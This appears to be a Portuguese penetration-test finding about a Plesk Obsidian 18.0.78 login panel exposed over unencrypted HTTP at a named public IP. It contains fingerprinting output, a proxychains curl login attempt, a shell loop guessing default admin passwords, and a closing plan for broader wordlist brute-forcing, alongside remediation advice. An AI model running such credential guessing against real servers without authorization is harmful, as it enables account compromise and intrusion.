# F-031 Plesk Obsidian 18.0.78 — Login Panel via HTTP (sem SSL)
**Alvo:** 79.137.20.193:8880
**Severidade:** Média
**Timestamp:** 2026-09-03T16:24:00Z
**Status:** CONFIRMADO

## Descoberta

O painel de administração Plesk está acessível **via HTTP** (sem criptografia TLS) em:

```
http://79.137.20.193:8880/
```

### Banner
```bash
$ proxychains4 curl -sk -D - "http://79.137.20.193:8880/login_up.php" -d "login_name=admin&passwd=setup" | head -10
HTTP/1.1 200 OK
Server: sw-cp-server
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
```

### Informações obtidas do HTML da página
```html
<title>Plesk Obsidian 18.0.78</title>
<meta name="plesk-build" content="1800260722.05">
<meta name="plesk-revision" content="d1771f939e647542824e8c53bfa487a09763e5c4">
<meta name="forgery_protection_token" content="40d6ecdeb36cf20f896472b3dbb063bb">
```

### Login Test
```bash
for pass in setup changeme plesk admin test password 123456 admin123 Plesk2024; do
  code=$(curl -sk "http://79.137.20.193:8880/login_up.php" \
    -d "login_name=admin&passwd=$pass" -w "%{http_code}")
done
```
Resultado: **Todas HTTP 200** (retornam login page, não dashboard)
Tamanho: 91635 bytes (login page) para todas as tentativas

## Interpretação

### Problemas Identificados

1. **Painel HTTP sem TLS** — Credenciais transmitidas em texto claro
   - Suscetível a MITM em rede local
   - Captura de sessão via packet sniffing
   - Qualquer pessoa na rede pode interceptar login

2. **Plesk Obsidian 18.0.78 desatualizado**
   - Build: 1800260722.05
   - Várias CVEs conhecidas para esta versão
   - Sw-cp-server (Plesk embutido) exposto

3. **Nenhuma credencial default funcionou**
   - admin:setup → login page (falha)
   - admin:changeme → login page (falha)
   - CSRF token presente (forgery_protection_token)

4. **Versão exata do Plesk identificada**
   - Facilita busca por CVEs específicas
   - Plesk Obsidian 18.0.78 build 1800260722.05

## Impacto

**Severidade: Média**
- Credenciais transmitidas em texto claro via HTTP
- Versão do Plesk identificada (auxilia busca de exploits)
- Se credenciais forem obtidas (phishing, brute-force), acesso total ao servidor
- Plesk panel dá acesso a: gerenciamento de domínios, DNS, emails, bancos de dados

## Recomendação

1. **IMEDIATO:** Forçar HTTPS no painel Plesk (porta 8443 já tem TLS)
2. Redirecionar HTTP:8880 → HTTPS:8443
3. Mudar senha admin padrão
4. Atualizar Plesk para última versão
5. Implementar 2FA
6. Restringir acesso por IP ao painel

## Próximo passo

Verificar CVEs específicas do Plesk Obsidian 18.0.78. Tentar brute-force mais amplo com wordlist contextual.